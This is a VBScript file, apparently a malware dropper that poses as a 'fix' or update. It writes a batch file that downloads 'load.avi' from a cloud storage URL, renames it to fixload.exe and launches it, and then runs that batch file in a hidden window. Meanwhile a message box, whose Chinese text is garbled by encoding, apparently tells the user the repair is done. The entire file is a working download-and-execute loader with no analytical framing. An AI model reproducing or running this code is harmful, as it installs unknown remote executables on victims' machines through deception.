Option Explicit

Dim fso, batFile, currentDir, WshShell

' ��ȡ��ǰĿ¼
Set fso = CreateObject("Scripting.FileSystemObject")
currentDir = fso.GetAbsolutePathName(".")

' ���� updat.bat �ļ���·��
batFile = currentDir & "\updat.bat"

' ���� updat.bat �ļ�������
Dim bat
Set bat = fso.CreateTextFile(batFile, True)

bat.WriteLine("@echo off")
bat.WriteLine("echo Downloading load.avi...")
bat.WriteLine("echo Set objXMLHTTP = CreateObject(""MSXML2.ServerXMLHTTP.6.0"") > download.vbs")
bat.WriteLine("echo objXMLHTTP.Open ""GET"", ""https://updatesdwn.oss-cn-shanghai.aliyuncs.com/load.avi"", False >> download.vbs")
bat.WriteLine("echo objXMLHTTP.Send >> download.vbs")
bat.WriteLine("echo If objXMLHTTP.Status = 200 Then >> download.vbs")
bat.WriteLine("echo   Set objStream = CreateObject(""ADODB.Stream"") >> download.vbs")
bat.WriteLine("echo   objStream.Type = 1 >> download.vbs")
bat.WriteLine("echo   objStream.Open >> download.vbs")
bat.WriteLine("echo   objStream.Write objXMLHTTP.ResponseBody >> download.vbs")
bat.WriteLine("echo   objStream.SaveToFile ""load.avi"", 2 >> download.vbs")
bat.WriteLine("echo   objStream.Close >> download.vbs")
bat.WriteLine("echo End If >> download.vbs")
bat.WriteLine("cscript //nologo download.vbs")
bat.WriteLine("del download.vbs")
bat.WriteLine("echo Renaming load.avi to fixload.exe...")
bat.WriteLine("ren load.avi fixload.exe")
bat.WriteLine("echo Executing fixload.exe...")
bat.WriteLine("start fixload.exe")
bat.WriteLine("echo Done.")

bat.Close

' ��ʾ�û�
MsgBox "�޸���ɣ���ˢ����ҳ����", vbInformation, "��ʾ"

' ���� WshShell ����
Set WshShell = CreateObject("WScript.Shell")

' ���� updat.bat
WshShell.Run batFile, 0, False

' �������
Set fso = Nothing
Set WshShell = Nothing
